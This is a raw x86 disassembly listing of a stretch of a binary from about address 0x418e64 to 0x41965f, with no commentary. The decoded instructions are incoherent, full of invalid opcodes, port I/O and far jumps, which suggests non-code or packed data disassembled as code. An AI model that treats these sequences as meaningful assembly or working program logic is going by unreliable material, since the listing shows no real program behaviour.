  418e64:	cmp    eax,0x3376d1f6
  418e69:	gs push es
  418e6b:	loop   0x418eca
  418e6d:	in     al,0xfa
  418e6f:	rcr    BYTE PTR [ebp+0x53eb2d3e],1
  418e75:	add    al,0x1f
  418e77:	out    dx,eax
  418e78:	mov    al,0x26
  418e7a:	imul   esi,DWORD PTR [ecx],0xffffffd0
  418e7d:	rcl    BYTE PTR [ebx-0x30141df3],cl
  418e83:	inc    esi
  418e84:	outs   dx,BYTE PTR ds:[esi]
  418e85:	mov    edx,0x376de779
  418e8a:	ret    
  418e8b:	xchg   esi,eax
  418e8c:	inc    ebp
  418e8d:	call   0xeaec:0xef6650f8
  418e94:	sub    edi,edx
  418e96:	push   ebx
  418e97:	retf   0x7dc5
  418e9a:	ja     0x418ed1
  418e9c:	loopne 0x418ef5
  418e9e:	adc    dl,BYTE PTR [ebp+0x22fe7645]
  418ea4:	or     cl,BYTE PTR [edx]
  418ea6:	jno    0x418eaa
  418ea8:	ds retf 0x7605
  418eac:	std    
  418ead:	or     bl,ah
  418eaf:	push   ebx
  418eb0:	inc    esi
  418eb1:	mov    ebp,0x6f303229
  418eb6:	cmp    DWORD PTR [esi],0xa771523f
  418ebc:	scas   al,BYTE PTR es:[edi]
  418ebd:	fwait
  418ebe:	jmp    0xf458:0xd50846d7
  418ec5:	cmp    ch,BYTE PTR [eax-0x9]
  418ec8:	lahf   
  418ec9:	push   ebp
  418eca:	and    BYTE PTR [eax+0x4c],bl
  418ecd:	hlt    
  418ece:	mov    bh,0x47
  418ed0:	outs   dx,DWORD PTR ds:[esi]
  418ed1:	cmp    eax,0x169e800e
  418ed6:	dec    edx
  418ed7:	out    0x4b,eax
  418ed9:	cmc    
  418eda:	xchg   esi,eax
  418edb:	lds    edx,FWORD PTR [esi+0x34]
  418ede:	repnz add BYTE PTR [ecx-0x77],ah
  418ee2:	and    DWORD PTR [edx+esi*1],edi
  418ee5:	cmc    
  418ee6:	not    BYTE PTR [ebp+0x6a8cb734]
  418eec:	pop    ecx
  418eed:	lods   eax,DWORD PTR ds:[esi]
  418eee:	fadd   QWORD PTR [esi-0x585c9ef2]
  418ef4:	jne    0x418f19
  418ef6:	ficomp WORD PTR [ebx]
  418ef8:	dec    edx
  418ef9:	fs cld 
  418efb:	push   ebx
  418efc:	lods   al,BYTE PTR ds:[esi]
  418efd:	or     BYTE PTR [edi],dh
  418eff:	push   cs
  418f00:	dec    DWORD PTR [ebx]
  418f02:	(bad)  
  418f03:	cmp    esp,edx
  418f05:	cmp    eax,0xb8684cb3
  418f0a:	es mov al,0xc2
  418f0d:	mov    eax,0x24f0d038
  418f12:	add    al,0xe7
  418f14:	adc    dh,BYTE PTR [esi+0x1e183412]
  418f1a:	cmp    BYTE PTR [ecx+0x66ffaaa3],al
  418f20:	pop    eax
  418f21:	iret   
  418f22:	inc    eax
  418f23:	dec    eax
  418f24:	xchg   edx,eax
  418f25:	in     al,0x87
  418f27:	mov    ah,0x83
  418f29:	xor    eax,0x1c7999ff
  418f2e:	cmp    BYTE PTR [esp+ebp*1+0x60ded8d5],0x17
  418f36:	stc    
  418f37:	mov    cs:0xb30e632b,eax
  418f3d:	fwait
  418f3e:	or     eax,DWORD PTR [ecx+edi*8-0x5d]
  418f42:	or     bh,BYTE PTR [eax]
  418f44:	ja     0x418fc0
  418f46:	fisttp QWORD PTR [ecx]
  418f48:	push   esp
  418f49:	repz sti 
  418f4b:	ins    BYTE PTR es:[edi],dx
  418f4c:	push   edi
  418f4d:	mov    ds:0xc0b11456,al
  418f52:	mov    dl,0x49
  418f54:	push   esi
  418f55:	adc    DWORD PTR [ebx+0xa],edx
  418f58:	jg     0x418f28
  418f5a:	lds    esi,FWORD PTR [edx+ebp*4+0x61]
  418f5e:	xchg   edx,eax
  418f5f:	into   
  418f60:	or     edi,DWORD PTR [ecx+ecx*8]
  418f63:	test   eax,0xda1698e
  418f68:	push   DWORD PTR [ecx+edi*8-0x46]
  418f6c:	push   ecx
  418f6d:	rcl    BYTE PTR [edx],cl
  418f6f:	js     0x418efe
  418f71:	xchg   esp,eax
  418f72:	ror    BYTE PTR [ebx+0x4f5784db],cl
  418f78:	aam    0xe7
  418f7a:	or     ebp,ebp
  418f7c:	pop    ebp
  418f7d:	and    eax,0x163f2615
  418f82:	call   0xf1e171b4
  418f87:	stos   BYTE PTR es:[edi],al
  418f88:	ins    DWORD PTR es:[edi],dx
  418f89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f8a:	div    BYTE PTR [ebx-0x1a2553cd]
  418f90:	cmp    eax,0xdacecb86
  418f95:	clc    
  418f96:	mov    ds:0x7728d9db,al
  418f9b:	adc    DWORD PTR [esi-0x37ee7b1d],0x1911d269
  418fa5:	pop    edx
  418fa6:	rol    DWORD PTR [ebx+0x70],cl
  418fa9:	pop    esi
  418faa:	inc    edi
  418fab:	inc    ecx
  418fac:	pop    ebp
  418fad:	ja     0x418f92
  418faf:	jne    0x418f7d
  418fb1:	inc    eax
  418fb2:	ins    DWORD PTR es:[edi],dx
  418fb3:	popa   
  418fb4:	inc    ebx
  418fb5:	push   ss
  418fb6:	mov    ebp,0xf8aee0a
  418fbb:	and    BYTE PTR gs:[ecx],dl
  418fbe:	fs cmp al,0x1c
  418fc1:	out    0x14,eax
  418fc3:	push   ebp
  418fc4:	pop    edx
  418fc5:	ret    
  418fc6:	scas   al,BYTE PTR es:[edi]
  418fc7:	mov    ebx,0xd51287d0
  418fcc:	xchg   edi,esp
  418fce:	mov    BYTE PTR [ebx+0x39106050],al
  418fd4:	test   DWORD PTR [esi-0x2074d784],0xaed0f8a3
  418fde:	push   esp
  418fdf:	lds    ebx,FWORD PTR [edx+0x28ece4fb]
  418fe5:	aas    
  418fe6:	fisttp DWORD PTR [ebx-0x58e3e3c3]
  418fec:	leave  
  418fed:	outs   dx,DWORD PTR ds:[esi]
  418fee:	mov    al,0xd6
  418ff0:	aad    0x1a
  418ff2:	sbb    al,0x7d
  418ff4:	add    BYTE PTR [edx],ch
  418ff6:	int3   
  418ff7:	test   DWORD PTR [edi+0x405cfe38],ebx
  418ffd:	enter  0x645,0xb0
  419001:	jns    0x41907b
  419003:	sbb    DWORD PTR [eax],eax
  419005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419006:	push   ds
  419007:	loopne 0x418f9c
  419009:	cmp    DWORD PTR [edx+ecx*4],edi
  41900c:	(bad)  
  41900d:	jmp    0xa868:0x59f20e0f
  419014:	stc    
  419015:	adc    esp,DWORD PTR [eax-0x445f8b4d]
  41901b:	cmp    dl,BYTE PTR [edi+eiz*8]
  41901e:	mul    BYTE PTR ds:0x824a0e20
  419024:	sar    DWORD PTR ds:0xe6721a46,cl
  41902a:	ja     0x419080
  41902c:	loop   0x4190a3
  41902e:	push   edx
  41902f:	je     0x419083
  419031:	cmc    
  419032:	rcr    ch,1
  419034:	pushf  
  419035:	xchg   esi,eax
  419036:	std    
  419037:	shr    DWORD PTR [ebx-0x4028d29a],0xac
  41903e:	inc    esp
  41903f:	sbb    BYTE PTR [eax],ch
  419041:	scas   eax,DWORD PTR es:[edi]
  419042:	not    ebx
  419044:	std    
  419045:	fidiv  WORD PTR [esi]
  419047:	cmp    DWORD PTR [ecx-0x18],esi
  41904a:	xchg   BYTE PTR [edx+edi*4+0x6ce97c8a],ch
  419051:	xor    eax,0x9477a0d3
  419056:	addr16 in eax,0x6e
  419059:	xchg   edx,eax
  41905a:	cmp    ebx,edi
  41905c:	or     cl,BYTE PTR [ecx+0x3b]
  41905f:	iret   
  419060:	jmp    0x419057
  419062:	mov    ds:0x69d6d11d,al
  419067:	ds mov esp,gs
  41906a:	ja     0x419062
  41906c:	cmp    edi,DWORD PTR [ecx+0xc1853d9]
  419072:	dec    edx
  419073:	pushf  
  419074:	push   0xffffffbf
  419076:	stos   BYTE PTR es:[edi],al
  419077:	(bad)  
  419078:	scas   al,BYTE PTR es:[edi]
  419079:	adc    eax,0x2095f101
  41907e:	mov    cl,0x86
  419080:	pop    ecx
  419081:	aad    0x2e
  419083:	jmp    0x46be53b
  419088:	push   ds
  419089:	dec    edx
  41908a:	push   ecx
  41908b:	data16 stc 
  41908d:	test   al,0x84
  41908f:	fcomp  DWORD PTR [ebx+0x53cc083f]
  419095:	in     al,dx
  419096:	sbb    DWORD PTR [ebp+0x68ba094d],edx
  41909c:	test   BYTE PTR [edi+0x3e],bl
  41909f:	scas   al,BYTE PTR es:[edi]
  4190a0:	dec    esp
  4190a1:	or     al,BYTE PTR [eax+0x117369a7]
  4190a7:	sar    DWORD PTR fs:[edi+0x10],0xe8
  4190ac:	fsincos 
  4190ae:	jecxz  0x4190f8
  4190b0:	icebp  
  4190b1:	jb     0x419120
  4190b3:	push   ss
  4190b4:	test   al,al
  4190b6:	pop    ebx
  4190b7:	sahf   
  4190b8:	loop   0x419128
  4190ba:	out    0xc7,al
  4190bc:	sbb    eax,0x4b865c76
  4190c1:	ja     0x419066
  4190c3:	(bad)  
  4190c4:	cmp    esi,ecx
  4190c6:	iret   
  4190c7:	getsec 
  4190c9:	xor    ebx,DWORD PTR [edi-0x1a555edb]
  4190cf:	pop    ecx
  4190d0:	outs   dx,BYTE PTR ds:[esi]
  4190d1:	cmc    
  4190d2:	mov    edi,0x60c3c4a6
  4190d7:	mov    ds:0x2cf27d52,al
  4190dc:	or     DWORD PTR [eax+0x5e9455b7],esp
  4190e2:	pop    es
  4190e3:	cs stos DWORD PTR es:[edi],eax
  4190e5:	jmp    0x4190a1
  4190e7:	stc    
  4190e8:	pushf  
  4190e9:	mov    BYTE PTR [edi],ch
  4190eb:	aad    0xa0
  4190ed:	push   ebx
  4190ee:	add    ecx,DWORD PTR [esi-0x21f5fb55]
  4190f4:	sar    DWORD PTR [eax-0xddb58b9],1
  4190fa:	jecxz  0x419094
  4190fc:	or     al,0x4b
  4190fe:	jmp    0x5ac0:0xee6128aa
  419105:	(bad)  
  419106:	xor    dh,ch
  419108:	dec    esp
  419109:	pop    ecx
  41910a:	stos   BYTE PTR es:[edi],al
  41910b:	sub    DWORD PTR [eax+0xdca4f7],ebx
  419111:	inc    eax
  419112:	mov    al,0xef
  419114:	rcr    ebx,0x94
  419117:	sub    BYTE PTR [eax+0x5c505ad3],cl
  41911d:	sub    al,0xc9
  41911f:	cmp    dl,BYTE PTR [ebx-0x5fc47758]
  419125:	arpl   WORD PTR [eax-0x5e],di
  419128:	pop    esi
  419129:	mov    ds:0xd3436db0,al
  41912e:	xor    BYTE PTR [ecx+eiz*2],dh
  419131:	dec    ebx
  419132:	push   edx
  419133:	pushf  
  419134:	pop    ds
  419135:	pop    es
  419136:	xchg   esp,eax
  419137:	jbe    0x419146
  419139:	ret    0x7448
  41913c:	ins    BYTE PTR es:[edi],dx
  41913d:	lea    ecx,[edi+0x6f]
  419140:	mov    ecx,ebp
  419142:	fldenv [ebx+0x1eaa72f3]
  419148:	and    BYTE PTR [edi+0x52260f02],cl
  41914e:	les    edi,FWORD PTR [edx-0x66fa32c]
  419154:	mov    ah,0x2f
  419156:	sub    al,0x53
  419158:	inc    ebx
  419159:	rol    BYTE PTR [edi-0x372cb4d1],1
  41915f:	push   ss
  419160:	or     DWORD PTR [ebp+0x56902be3],esi
  419166:	xchg   edi,eax
  419167:	cmp    BYTE PTR [edi-0x67],0x27
  41916b:	or     bl,BYTE PTR [eax]
  41916d:	xlat   BYTE PTR ds:[ebx]
  41916e:	lock std 
  419170:	push   ecx
  419171:	jne    0x4191de
  419173:	cdq    
  419174:	dec    edi
  419175:	rol    DWORD PTR [ebx],cl
  419177:	aam    0x1d
  419179:	sub    al,0x9c
  41917b:	sbb    dl,BYTE PTR [edx-0x550ae4e1]
  419181:	push   0xf2556e42
  419186:	sub    eax,0x44ca6e8
  41918b:	pop    esp
  41918c:	dec    edi
  41918d:	rol    BYTE PTR [edx+0x3cf63dd4],1
  419193:	push   edi
  419194:	retf   0x123a
  419197:	nop
  419198:	aaa    
  419199:	xor    al,0xe4
  41919b:	mov    ebp,cs
  41919d:	js     0x41916b
  41919f:	cmp    dl,BYTE PTR [esi+0x7]
  4191a2:	and    BYTE PTR [edx+ecx*1-0x4b],bl
  4191a6:	adc    edx,DWORD PTR [ebp-0x33]
  4191a9:	ret    
  4191aa:	xchg   esp,eax
  4191ab:	dec    ebx
  4191ac:	je     0x419132
  4191ae:	mov    al,0x60
  4191b0:	and    DWORD PTR [ebx+0x31517b20],edi
  4191b6:	mov    edx,DWORD PTR [esi]
  4191b8:	jo     0x4191a4
  4191ba:	add    eax,0xec883ec2
  4191bf:	(bad)  
  4191c0:	cmp    dl,bh
  4191c2:	inc    eax
  4191c3:	xchg   edx,eax
  4191c4:	sbb    dh,BYTE PTR ds:0x97cea606
  4191ca:	jg     0x4191b2
  4191cc:	mov    dh,bl
  4191ce:	aam    0xd1
  4191d0:	pop    es
  4191d1:	enter  0x9e61,0xf9
  4191d5:	not    DWORD PTR [ecx+0x33541d78]
  4191db:	push   ss
  4191dc:	test   ch,ah
  4191de:	add    DWORD PTR [ebx+0x1d],esi
  4191e1:	pop    ss
  4191e2:	xlat   BYTE PTR ds:[ebx]
  4191e3:	cmp    DWORD PTR [ebx+edx*8-0x64664293],ecx
  4191ea:	push   ebp
  4191eb:	inc    esi
  4191ec:	sbb    al,0x7d
  4191ee:	pop    ds
  4191ef:	cmp    eax,0xab349b77
  4191f4:	out    dx,al
  4191f5:	nop
  4191f6:	push   es
  4191f7:	out    dx,al
  4191f8:	call   0xe7f3:0x905a4e74
  4191ff:	pop    esi
  419200:	retf   
  419201:	mov    al,0x10
  419203:	stos   BYTE PTR es:[edi],al
  419204:	xchg   eax,esi
  419206:	(bad)  
  419207:	fsub   QWORD PTR [esi]
  419209:	push   cs
  41920a:	inc    ecx
  41920b:	push   esp
  41920c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41920d:	mov    ebx,0x80e49e14
  419212:	into   
  419213:	push   edi
  419214:	and    dh,dh
  419216:	adc    BYTE PTR [eax],bl
  419218:	sub    dh,dh
  41921a:	pop    es
  41921b:	inc    edi
  41921c:	(bad)  
  41921d:	dec    ebp
  41921e:	inc    ebx
  41921f:	js     0x4191ef
  419221:	mov    DWORD PTR [ebx+0x75433ec8],eax
  419227:	mov    ch,0x17
  419229:	dec    esp
  41922a:	jo     0x419260
  41922c:	cmp    edx,eax
  41922e:	sbb    bh,BYTE PTR [ebx]
  419230:	das    
  419231:	imul   edi,eax,0x51
  419234:	xchg   esi,eax
  419235:	mov    cs,WORD PTR [ebx-0x38]
  419238:	daa    
  419239:	mov    ah,ah
  41923b:	inc    esi
  41923c:	(bad)  
  41923d:	mov    cl,0x90
  41923f:	xor    eax,0x2b4c2a48
  419244:	imul   esi,DWORD PTR [edx-0xcc1ed40],0xffffffe6
  41924b:	data16 clc 
  41924d:	retf   
  41924e:	xchg   ecx,eax
  41924f:	push   ss
  419250:	pop    esp
  419251:	mov    dh,0xd1
  419253:	push   0x8c9f1cf7
  419258:	mov    bh,0x15
  41925a:	jecxz  0x419215
  41925c:	ins    DWORD PTR es:[edi],dx
  41925d:	loopne 0x4192a1
  41925f:	nop
  419260:	pop    esp
  419261:	shr    dh,0x1e
  419264:	add    al,BYTE PTR [ebp-0x3a8f8fca]
  41926a:	adc    ch,bh
  41926c:	mov    ah,0x61
  41926e:	loop   0x4192ee
  419270:	(bad)  
  419271:	leave  
  419272:	add    ebx,DWORD PTR [edx+0x61]
  419275:	lock inc ebx
  419277:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419279:	sub    eax,0x9d473bdf
  41927e:	fcomp  QWORD PTR [ecx-0x18]
  419281:	out    0xef,eax
  419283:	add    BYTE PTR ds:0xb4799287,bl
  419289:	popa   
  41928a:	jbe    0x4192dc
  41928c:	inc    edi
  41928d:	xor    edi,ebp
  41928f:	shl    BYTE PTR [ebx-0x12],0x85
  419293:	js     0x41928b
  419295:	jge    0x419232
  419297:	dec    cl
  419299:	call   0x7a5d:0x94773973
  4192a0:	dec    ecx
  4192a1:	jne    0x4192d5
  4192a3:	in     al,dx
  4192a4:	cmc    
  4192a5:	mov    WORD PTR [esi],gs
  4192a7:	imul   esp,DWORD PTR [edx-0x42355994],0xffffffd2
  4192ae:	jl     0x4192e2
  4192b0:	imul   edi,DWORD PTR ds:0x20fd094,0xffffffaf
  4192b7:	push   ecx
  4192b8:	and    al,0x9c
  4192ba:	popa   
  4192bb:	jno    0x4192e8
  4192bd:	std    
  4192be:	enter  0x9520,0xec
  4192c2:	arpl   WORD PTR [edi+eax*4+0x72cdde28],cx
  4192c9:	outs   dx,BYTE PTR ds:[esi]
  4192ca:	pop    esp
  4192cb:	jg     0x419267
  4192cd:	xor    esp,ebx
  4192cf:	int    0xe
  4192d1:	xor    al,0x85
  4192d3:	popa   
  4192d4:	dec    ebp
  4192d5:	sub    ch,BYTE PTR [eax-0x2321da58]
  4192db:	int    0x9c
  4192dd:	mov    WORD PTR [edx+0x26dc66bd],es
  4192e3:	pop    es
  4192e4:	lahf   
  4192e5:	stc    
  4192e6:	fcmovne st,st(4)
  4192e8:	push   es
  4192e9:	imul   esi,DWORD PTR [edi],0x398967d
  4192ef:	fsubrp st(2),st
  4192f1:	pop    ss
  4192f2:	add    eax,0x878b3dfb
  4192f7:	lods   al,BYTE PTR ds:[esi]
  4192f8:	sbb    ch,ah
  4192fa:	pop    esi
  4192fb:	add    dl,BYTE PTR [eax+0x48]
  4192fe:	repz test dh,0x74
  419302:	pop    ecx
  419303:	test   BYTE PTR [ecx],ch
  419305:	pop    ebx
  419306:	mov    DWORD PTR [ecx+eiz*8-0x4c],ecx
  41930a:	(bad)  
  41930b:	cwde   
  41930c:	jae    0x41937a
  41930e:	gs aad 0xd8
  419311:	sub    esp,DWORD PTR [eax]
  419313:	fld    DWORD PTR [ebp+0x11b99f80]
  419319:	cmc    
  41931a:	jne    0x419358
  41931c:	mov    esp,0xe1f6fa11
  419321:	nop
  419322:	xchg   edx,eax
  419323:	in     al,0x62
  419325:	(bad)  
  419326:	outs   dx,BYTE PTR ds:[esi]
  419327:	out    dx,al
  419328:	push   DWORD PTR [esi+0x5712076]
  41932e:	gs fcom st(5)
  419331:	cmp    al,0x5d
  419333:	out    dx,eax
  419334:	cmp    esi,DWORD PTR [eax+0x4d]
  419337:	sbb    BYTE PTR [edx+0x79],cl
  41933a:	mov    ecx,0xc834a2fc
  41933f:	mov    al,ds:0xb8842fb1
  419344:	and    BYTE PTR [ebx-0x577f17d6],al
  41934a:	in     al,0x18
  41934c:	xchg   DWORD PTR [ecx],ebp
  41934e:	mov    edx,0xbe2d6e5f
  419353:	cli    
  419354:	imul   esp,DWORD PTR [edi+eiz*8+0x6e],0x3314c93c
  41935c:	out    0xe8,eax
  41935e:	sar    BYTE PTR [edi+0x2c],0xff
  419362:	aas    
  419363:	lods   al,BYTE PTR ds:[esi]
  419364:	adc    BYTE PTR [edx+0x241c44d3],ch
  41936a:	lds    esi,FWORD PTR [esi+0x6e]
  41936d:	sbb    eax,0x4fb4bdb4
  419372:	mov    cs,edi
  419374:	jb     0x4193dc
  419376:	inc    ebp
  419377:	and    edi,DWORD PTR [ebx+0x60862b1d]
  41937d:	sub    ah,BYTE PTR [ebp+0x2ae3898e]
  419383:	dec    eax
  419384:	pop    edi
  419385:	mov    esp,0xec1fb8f7
  41938a:	mov    al,ds:0xf7a7091a
  41938f:	es (bad) 
  419391:	jns    0x4193bc
  419393:	shr    edx,0x3f
  419396:	push   0x67
  419398:	int3   
  419399:	stos   DWORD PTR es:[di],eax
  41939b:	imul   eax,DWORD PTR [ebx-0x469bc414],0x85712e9b
  4193a5:	mov    dl,BYTE PTR [ebp+0x73]
  4193a8:	add    DWORD PTR [ebp+0x5624a201],esp
  4193ae:	and    BYTE PTR [eax],0xec
  4193b1:	jge    0x4193a2
  4193b3:	jge    0x41940d
  4193b5:	sub    DWORD PTR [ebp+0x7f5fa01e],edx
  4193bb:	and    al,0xb2
  4193bd:	jge    0x4193a4
  4193bf:	aad    0x6d
  4193c1:	push   ss
  4193c2:	in     eax,dx
  4193c3:	push   eax
  4193c4:	mov    edx,0xcd206576
  4193c9:	sub    eax,0x48d1c967
  4193ce:	xchg   ebx,eax
  4193cf:	imul   esp,ebx,0xfffffff3
  4193d2:	fisub  WORD PTR [ecx]
  4193d4:	xor    al,dl
  4193d6:	xchg   ecx,eax
  4193d7:	stc    
  4193d8:	fsubr  QWORD PTR [ecx-0x7e979a08]
  4193de:	inc    ebx
  4193df:	lahf   
  4193e0:	adc    ah,ch
  4193e2:	dec    esi
  4193e3:	iret   
  4193e4:	xacquire xrelease xchg BYTE PTR [esi+0x20],al
  4193e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193ea:	sub    cl,ch
  4193ec:	jmp    0x4193e2
  4193ee:	mov    ds:0xb0ea9797,eax
  4193f3:	les    eax,FWORD PTR [esi+0x22]
  4193f6:	fcmovnb st,st(4)
  4193f8:	add    eax,0x40cc5e3d
  4193fd:	mov    DWORD PTR [edx],0x8d89f5dc
  419403:	jg     0x419465
  419405:	jo     0x419451
  419407:	xor    DWORD PTR [eax],0x30083bb
  41940d:	sub    al,0x66
  41940f:	sub    edx,ebp
  419411:	loop   0x419452
  419413:	adc    eax,0x68e15f0
  419418:	xchg   edi,eax
  419419:	sub    eax,0xa8b2e6ed
  41941e:	fdivp  st(0),st
  419420:	sub    esp,DWORD PTR [eax]
  419422:	push   0xfb76e5c5
  419427:	jmp    0x4193e2
  419429:	lods   eax,DWORD PTR ds:[esi]
  41942a:	mov    ebp,0x6dbc49e4
  41942f:	mov    esi,0x965806cd
  419434:	or     ch,dh
  419436:	pushf  
  419437:	(bad)  
  419438:	repz mov ebx,0xb6a18956
  41943e:	lods   al,BYTE PTR ds:[esi]
  41943f:	out    dx,eax
  419440:	retf   0xd08c
  419443:	xor    ah,bl
  419445:	nop
  419446:	pop    ecx
  419447:	pop    eax
  419448:	ret    0x8aeb
  41944b:	scas   eax,DWORD PTR es:[edi]
  41944c:	test   eax,0xec9e169c
  419451:	add    BYTE PTR [ebx],cl
  419453:	dec    edi
  419454:	push   esi
  419455:	pushf  
  419456:	(bad)  
  419457:	or     DWORD PTR [ebp-0x771cd55d],esi
  41945d:	cdq    
  41945e:	dec    ebx
  41945f:	(bad)  
  419461:	ds repnz (bad) 
  419464:	shl    DWORD PTR gs:0x403ba6e,1
  41946b:	pushf  
  41946c:	and    eax,0xdead128c
  419471:	and    esp,esi
  419473:	or     dh,BYTE PTR [ebp+0x1a972518]
  419479:	rcl    DWORD PTR [esp+eax*1-0x6a006bca],0xfc
  419481:	sub    ah,bl
  419483:	sti    
  419484:	addr16 push ss
  419486:	cmp    BYTE PTR [edx],bl
  419488:	hlt    
  419489:	pop    esi
  41948a:	dec    esi
  41948b:	cmp    ecx,DWORD PTR fs:[ebx-0x1a]
  41948f:	test   esp,ebx
  419491:	and    BYTE PTR [ebp+0x48028a1a],bh
  419497:	add    dl,bh
  419499:	and    ebp,edx
  41949b:	jae    0x419502
  41949d:	adc    al,al
  41949f:	adc    DWORD PTR [edx+0x2f1bc08c],ebp
  4194a5:	and    edi,ecx
  4194a7:	mov    ecx,0xd431e6d7
  4194ac:	xor    edx,DWORD PTR [bp+di+0x47ad]
  4194b1:	mov    ebp,esi
  4194b3:	das    
  4194b4:	adc    DWORD PTR [ebx-0x14d733fa],eax
  4194ba:	jmp    0x4194eb
  4194bc:	ficomp DWORD PTR [esp+ebp*4+0x58eb2973]
  4194c3:	pop    es
  4194c4:	jbe    0x41944c
  4194c6:	sbb    BYTE PTR [eax],0x3a
  4194c9:	(bad)  
  4194ca:	jg     0x419497
  4194cc:	aad    0xa
  4194ce:	popa   
  4194cf:	aas    
  4194d0:	adc    DWORD PTR [esi+eax*4+0x3],edi
  4194d4:	push   ebp
  4194d5:	inc    eax
  4194d6:	enter  0x3f2d,0x71
  4194da:	jle    0x41951a
  4194dc:	pop    ds
  4194dd:	jg     0x4194c8
  4194df:	adc    BYTE PTR [eax-0x147eded3],ah
  4194e5:	push   es
  4194e6:	mov    ds:0xd4893c1a,eax
  4194eb:	mov    ebx,0xb4ed2b27
  4194f0:	inc    ebp
  4194f1:	aas    
  4194f2:	ins    BYTE PTR es:[edi],dx
  4194f3:	shl    DWORD PTR [edx+ebx*2],cl
  4194f6:	clc    
  4194f7:	sti    
  4194f8:	fidiv  DWORD PTR [ecx+0x42]
  4194fb:	scas   al,BYTE PTR es:[edi]
  4194fc:	or     DWORD PTR [edx+0x5d],ebp
  4194ff:	popf   
  419500:	sub    ebp,DWORD PTR [edi]
  419502:	fst    DWORD PTR [edx+esi*1+0x35]
  419506:	mov    ss,WORD PTR [ecx+ebx*8-0x58bd545d]
  41950d:	(bad)  
  41950e:	mov    esi,0xcf4a5e32
  419513:	shl    BYTE PTR [ebx],1
  419515:	adc    al,0x26
  419517:	push   cs
  419518:	sub    esp,DWORD PTR [eax]
  41951a:	push   es
  41951b:	inc    esi
  41951c:	aaa    
  41951d:	loopne 0x41955c
  41951f:	sar    BYTE PTR [edi],0x50
  419522:	mov    al,0xc
  419524:	sub    esp,DWORD PTR [edx]
  419526:	retf   
  419527:	dec    edi
  419528:	mov    edx,DWORD PTR [ebx-0x25620ec4]
  41952e:	int3   
  41952f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419530:	lods   eax,DWORD PTR ds:[esi]
  419531:	xor    BYTE PTR [edi-0x6708f3b7],dh
  419537:	jle    0x419586
  419539:	cmp    BYTE PTR [esi-0x59d5b692],0xfb
  419540:	mov    al,BYTE PTR [esi+0x7eb4d65]
  419546:	ins    BYTE PTR es:[edi],dx
  419547:	sbb    al,0x65
  419549:	cmp    al,bh
  41954b:	pop    edx
  41954c:	pop    es
  41954d:	jns    0x41958c
  41954f:	or     ebp,ebp
  419551:	fs fwait
  419553:	call   0x20ac:0xcedee424
  41955a:	mov    ds:0xdbccbf92,al
  41955f:	mov    cl,0x53
  419561:	jmp    0xe183136c
  419566:	add    al,0xe5
  419568:	fidivr WORD PTR [ebx+0x3]
  41956b:	cs gs jmp 0x419548
  41956f:	mov    bl,0x56
  419571:	dec    edi
  419572:	cmp    bl,BYTE PTR [ecx+0x9cd9459]
  419578:	daa    
  419579:	enter  0x135c,0x4
  41957d:	add    bl,dl
  41957f:	dec    esi
  419580:	dec    esp
  419581:	inc    esi
  419582:	ret    
  419583:	data16 jecxz 0x4195bf
  419586:	inc    esp
  419587:	(bad)  [esi-0x58d97184]
  41958d:	inc    edx
  41958e:	ror    BYTE PTR [esi+ecx*4+0x4405499d],cl
  419595:	pop    ebx
  419596:	sbb    BYTE PTR [ebp+0x6e],al
  419599:	fsubr  QWORD PTR [edi-0x3a]
  41959c:	xor    BYTE PTR [edx-0x16500538],ch
  4195a2:	push   ecx
  4195a3:	outs   dx,DWORD PTR cs:[esi]
  4195a5:	ret    0xd4de
  4195a8:	add    BYTE PTR [edx+edi*1+0x281d43d2],cl
  4195af:	out    dx,eax
  4195b0:	jae    0x41954f
  4195b2:	jmp    0x48f7:0x1cc393eb
  4195b9:	in     eax,dx
  4195ba:	jp     0x4195e4
  4195bc:	xchg   ecx,eax
  4195bd:	jno    0x419617
  4195bf:	dec    eax
  4195c0:	inc    ebx
  4195c1:	and    al,0x57
  4195c3:	pop    edx
  4195c4:	adc    ebx,DWORD PTR [ebp-0x63]
  4195c7:	jno    0x419624
  4195c9:	cmc    
  4195ca:	xchg   ecx,eax
  4195cb:	or     bh,BYTE PTR [edi+ebx*8]
  4195ce:	and    esp,ebx
  4195d0:	aas    
  4195d1:	xchg   edx,eax
  4195d2:	mov    eax,0xdec87d42
  4195d7:	xchg   edx,eax
  4195d8:	mov    WORD PTR [eax+0x7c],cs
  4195db:	in     al,0x6
  4195dd:	mov    ah,0xa8
  4195df:	dec    eax
  4195e0:	outs   dx,BYTE PTR ds:[esi]
  4195e1:	jecxz  0x4195e8
  4195e3:	stos   BYTE PTR es:[edi],al
  4195e4:	je     0x41957a
  4195e6:	xor    ebx,DWORD PTR [ebp+0x1a]
  4195e9:	or     ecx,DWORD PTR [ebp-0x15]
  4195ec:	and    eax,0xcacc6fa2
  4195f1:	push   esi
  4195f2:	cs push es
  4195f4:	fist   DWORD PTR [edi-0x2d169d9d]
  4195fa:	inc    bl
  4195fc:	in     al,dx
  4195fd:	lds    ebp,FWORD PTR [edx]
  4195ff:	dec    ecx
  419600:	pushf  
  419601:	popf   
  419602:	shl    esi,1
  419604:	mov    ds:0x79f1b08f,eax
  419609:	add    edx,DWORD PTR [ebx]
  41960b:	adc    al,0xd2
  41960d:	nop
  41960e:	and    ch,BYTE PTR [ebp+ebx*4+0x16]
  419612:	sub    DWORD PTR [edi+0x56911c6b],eax
  419618:	call   0x7527:0x4f07aefa
  41961f:	mov    ds:0xd9d176ae,eax
  419624:	mov    ds:0xfd84f08b,al
  419629:	xchg   esp,eax
  41962a:	sbb    bh,al
  41962c:	and    al,0x16
  41962e:	or     cl,BYTE PTR [edi+0x4f2686c5]
  419634:	adc    ebx,0x6a7594e6
  41963a:	add    bl,cl
  41963c:	mov    ah,0x79
  41963e:	sahf   
  41963f:	sbb    BYTE PTR [edi],dh
  419641:	dec    ebp
  419642:	iret   
  419643:	sub    DWORD PTR [eax+0x54],edx
  419646:	adc    ebx,edx
  419648:	call   0x807fe1a2
  41964d:	std    
  41964e:	mov    edx,0x9bbf93b7
  419653:	dec    edx
  419654:	pop    ebp
  419655:	jmp    0x419689
  419657:	xor    DWORD PTR [ebx-0x1c],0xec591a22
  41965e:	xlat   BYTE PTR ds:[ebx]
  41965f:	inc    DWORD PTR [ebp-0x4af89fb8]
